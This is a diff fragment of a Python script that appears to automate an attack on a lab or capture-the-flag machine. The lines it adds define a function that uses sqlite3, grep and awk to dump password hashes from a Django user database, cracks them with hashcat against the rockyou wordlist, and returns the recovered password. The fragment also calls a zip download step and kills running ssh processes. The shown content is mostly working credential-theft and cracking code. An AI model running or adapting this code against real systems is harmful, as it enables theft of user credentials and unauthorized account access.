@@ -108,12 +108,16 @@ def DownloadZip(username, passZip):
 
 	time.sleep(1)
 
+def CrackPass():
 	os.system("sqlite3 db.sqlite3 --line 'select * from accounts_customuser' | grep 'password' | awk 'NF{print $NF}' > hashes")
 
 	os.system("hashcat --quiet -a 0 -m 124 hashes /usr/share/wordlists/rockyou.txt -o hash")
 
+	with open('hash', 'r') as file:
 
+		password_2 = file.read()
 
+	return	re.findall(":(.*)",password_2)[0]
 
 if __name__ == "__main__":
 
@@ -140,4 +144,8 @@ if __name__ == "__main__":
 	subprocess.Popen(["killall","/usr/bin/ssh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 	DownloadZip(username, passZip)
+
+	password_2 = CrackPass()
+
+
 
